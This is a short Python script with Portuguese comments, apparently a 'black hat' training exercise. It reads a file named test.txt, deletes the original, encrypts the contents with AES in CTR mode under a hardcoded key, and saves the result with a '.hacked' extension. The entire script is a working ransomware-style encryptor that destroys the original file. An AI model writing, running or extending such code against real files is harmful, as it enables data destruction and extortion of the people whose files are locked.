import os
import pyaes

#abrir arquivo e copiar
file_name = "test.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#remover o arquivo original
os.remove(file_name)

# gerar a chave de criptografia
key = b"blackhatpythoncs" #chave de 16 bytes
aes = pyaes.AESModeOfOperationCTR(key)

# criptografar o arquivo
crypto_data = aes.encrypt(file_data)

#salvar arquivo criptografado
new_file = file_name + ".hacked"
new_file = open(f'{new_file}', "wb")
new_file.write(crypto_data)
new_file.close()
